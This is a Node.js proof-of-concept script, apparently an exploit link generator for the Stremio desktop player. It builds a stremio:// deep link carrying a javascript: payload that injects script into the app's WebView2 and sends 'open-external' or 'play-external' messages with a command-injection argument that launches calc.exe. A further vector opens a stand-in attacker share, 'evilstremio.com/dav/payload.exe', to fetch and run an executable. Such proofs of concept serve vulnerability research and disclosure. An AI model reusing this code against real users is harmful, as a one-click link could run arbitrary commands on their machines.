// node url-creator.js [vector] [target]
// Generates a stremio-player link that runs calc.exe

const zlib = require('zlib');
// Options:
// "external" - uses open-external
// "vlc" - uses play-external; does not require vlc to be installed
// "potplayer" - uses play-external; does not require potplayer to be installed
// "unc" - uses window.open()'s smb/webdav run UNTESTED
const vector = process.argv[2] || "external"
// target override (argv[3]): unc = share URL
const target = process.argv[3]

let ARG, RPC, TOP_JS;
if (vector == "external") {
    ARG = 'https://web.stremio.com/" <. & calc.exe & rem ';
    RPC = JSON.stringify({ id: 1, args: ['open-external', ARG] });
}
if (vector == "vlc" || vector == "potplayer") {
    ARG = `${vector}://web.stremio.com/" <. & calc.exe & rem `;
    RPC = JSON.stringify({ id: 1, args: ['play-external', ARG] });
}
if (vector == "unc") {
    const url = target || 'file://evilstremio.com/dav/payload.exe';
    TOP_JS = `window.open(${JSON.stringify(url)}, '_blank')`;
    console.error(`window.open target: ${url}`);
    console.error(`window.open may need a user gesture depending on WebView2 popup policy.`);
}
if (RPC) {
    TOP_JS = 'window.chrome.webview.postMessage(' + JSON.stringify(RPC) + ')';
}
if (!TOP_JS) {
    throw new Error(`Unknown vector: ${vector}`);
}

const PAYLOAD = 'javascript:void' + encodeURIComponent(
    "(function(){var s=top.document.createElement('script');s.textContent=" +
    JSON.stringify(TOP_JS) +
    ";top.document.documentElement.appendChild(s);s.remove();}())"
);
const encoded = encodeURIComponent(
    zlib.deflateSync(Buffer.from(JSON.stringify({ playerFrameUrl: PAYLOAD }), 'utf8')).toString('base64')
);
console.log(PAYLOAD)
console.log(`\nstremio:///player/${encoded}`);
